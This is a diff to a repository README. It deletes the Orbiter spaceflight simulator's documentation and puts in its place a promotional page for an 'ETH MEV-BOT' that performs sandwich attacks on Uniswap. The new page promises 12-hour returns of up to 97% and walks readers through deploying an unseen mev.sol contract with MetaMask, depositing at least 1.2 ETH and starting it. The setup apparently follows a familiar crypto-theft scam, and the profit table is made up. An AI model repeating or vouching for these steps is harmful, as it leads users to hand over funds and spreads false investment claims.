@@ -1,108 +1,101 @@
-![Orbiter logo](./Src/Orbiter/Bitmaps/banner.png)
+---
 
-# Orbiter Space Flight Simulator
+<div align="center">
 
-Orbiter is a spaceflight simulator based on Newtonian mechanics. Its playground
-is our solar system with many of its major bodies – the sun, planets and moons.
-You take control of a spacecraft – either historic, hypothetical, or purely
-science fiction. Orbiter is unlike most commercial computer games with a space
-theme – there are no predefined missions to complete (except the ones you set
-yourself), no aliens to destroy and no goods to trade. Instead, you will get a
-pretty good idea about what is involved in real space flight – how to plan an
-ascent into orbit, how to rendezvous with a space station, or how to fly to
-another planet. It is more difficult, but also more of a challenge. Some people
-get hooked, others get bored. Finding out for yourself is easy – simply give it
-a try. Orbiter is free, so you don’t need to invest more than a bit of your
-spare time.
+# 💎🤖 ETH MEV-BOT 🤖💎
+  
+An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.
 
-## License
+</div>
 
-Orbiter is now published as an Open Source project under the MIT License (see
-[LICENSE](./LICENSE) file for details).
+---
 
-D3D9Client graphics engine is licensed under LGPL, see [LGPL](./OVP/D3D9Client/LGPL.txt)
+## 📚 About
 
-## Installation
-|  | Minimum requirements | Recommended requirements |
-| ---- | ---- | ---- |
-| RAM: | 4GB | 8GB |
-| CPU: | Dual Core |  |
-| GPU: | 200 GFlops | 500 GFlops |
-| Disk: | 5GB of free space | 10GB of free space (80GB if you want hi-res textures) |
+In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.
 
-Get the Orbiter source repository from github
-```bash
-git clone --recursive git@github.com:orbitersim/orbiter.git
-```
-or
-```bash
-git clone --recursive https://github.com/orbitersim/orbiter.git
-```
+---
 
-To configure and generate the makefiles, you need a recent
-[CMake](https://cmake.org/download/).
+<div align="center">
 
-To compile Orbiter from its sources, you need
-[Microsoft Visual Studio](https://visualstudio.microsoft.com/downloads/).
-Orbiter has been successfully built with VS Community 2019, but other versions should
-also work. Note that VS2019 comes with built-in CMake support, so you don't
-need a separate CMake installation.
+## 🚀 How it Works
 
-Some configuration caveats:
-- If you are using the [Ninja](https://cmake.org/cmake/help/latest/generator/Ninja.html)
-generator (default for the VS built-in CMake), you may also need
-[vspkg](https://github.com/microsoft/vcpkg) to configure the VS toolset.
-- If you are using the VS2019 generator, you may need to set up Visual Studio to use
-only a single thread for the build. This is because some of the build tools (especially
-those for generating the Orbiter documentation) are not threadsafe, and the VS2019
-generator doesn't understand the CMake JOB_POOL directive.
+![profit](https://i.ibb.co/t39DBd6/1.jpg)
 
-Orbiter is a 32-bit application. Be sure to configure vspkg and CMake accordingly.
+</div>
 
-If you want to build the documentation, you need a few additional tools:
-- a filter to convert ODT and DOC sources to PDF, such as
-  [LibreOffice](https://www.libreoffice.org/download/download/).
-- a LaTeX compiler suite such as [MiKTeX](https://miktex.org/download).
-- [Doxygen](https://www.doxygen.nl/index.html) for building the source-level
-  documentation for developers.
+Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.
 
-By default, the build is configured to create both graphics flavours of the
-Orbiter executable (although this can be configured with the ORBITER_GRAPHICS CMake flag):
-- ``orbiter.exe`` is the standalone Orbiter application with built-in DX7 graphics.
-- ``orbiter_ng.exe`` is a launcher for ``./Modules/Server/orbiter.exe`` which is the
-graphics server version of Orbiter. It requires an external graphics client
-plugin to be loaded via the Modules tab of the Orbiter Launchpad dialog.
-The reference D3D7Client is included with the build with essentially the same
-functionality as the built-in graphics version. Use 3rd party client
-implementations to make use of more modern graphics engines.
+---
 
-See [README.compile](./README.compile) for details on building Orbiter.
+## ETH Investment Returns
 
-## Planet textures
+Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:
 
-The Orbiter git repository does not include most of the planetary texture files
-required for running Orbiter.
-You need to install those separately. The easiest way to do so is by installing
-[Orbiter 2016](http://orbit.medphys.ucl.ac.uk/download.html). Optionally you can
-also install high-resolution versions of the textures from the Orbiter website.
-You should keep the Orbiter 2016 installation separate from your Orbiter git
-repository.
+| ETH Range (invested) | Returns (12 hours) |
+| --- | --- |
+| `1.2ETH - 2.4ETH` | `up to 10%` |
+| `2.4ETH - 5ETH` | `up to 20%` |
+| `5ETH - 10ETH` | `20-27%` |
+| `10ETH - 20ETH` | `27-35%` |
+| `20ETH - 50ETH` | `35-50%` |
+| `50ETH - 100ETH` | `50-63%` |
+| `100ETH - 200ETH` | `63-76%` |
+| `200ETH - 500ETH` | `76-97%` |
+| `500ETH and above` | `97%+` |
 
-To configure Orbiter to use the 2016 texture installation, set the
-ORBITER_PLANET_TEXTURE_INSTALL_DIR entry in CMake. For example, if Orbiter 2016
-was installed in `C:\Orbiter2016`, the CMake option should be set to
-`C:/Orbiter2016/Textures`.
-Alternatively, you can configure the texture directory after building Orbiter
-by setting the `PlanetTexDir` entry in `Orbiter.cfg`.
+**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.
 
-## Help
+---
 
-Help files are located in the Doc subfolder (if you built them). Orbiter.pdf is the
-main Orbiter user manual.
+## 👨‍💻 Instructions
 
-The in-game help system can be opened via the "Help" button on
-the Orbiter Launchpad dialog, or with Alt-F1 while running
-Orbiter.
+1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
+  - 📁 Create a new file mev.sol and paste the code from mev.sol.
 
-Remaining questions can be posted on the Orbiter user forum at
-[orbiter-forum.com](https://www.orbiter-forum.com).
+
+<img src="https://i.ibb.co/m8ZQRwp/2.png" alt="2" border="0">
+
+2) 🔧 Select compiler version 0.6.12 and press compile.
+
+![2](https://i.ibb.co/2Ns7jqm/3.png)
+
+3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
+
+![3](https://i.ibb.co/NCsWwyW/4.png)
+
+4) Verify your smart contract on etherscan -
+
+- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
+   - 📝 Enter contract address and set inputs:
+   - Compiler Type: Solidity (Single File)
+   - Compiler Version: ^0.6.12
+   - License Type: 3) MIT License (MIT)
+   - 📋 Paste the code from mev.sol.
+   - 🚫 Leave ABI input box empty.
+   - 🟢 Click "Verify"
+
+
+5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
+ 
+6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
+
+<img width="780" alt="4" src="https://i.ibb.co/Dp5nXPN/5.png">
+
+7) Withdraw anytime by clicking 'withdrawal'.
+
+:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
+
+At any point, you can stop the bot or retrieve your money by calling the withdrawal function.
+
+<div align="center">
+
+💰💰💰 Make money with MevBot 💰💰💰
+
+</div>
+
+---
+
+##### Please ⭐ the repo to support my project
+---
+
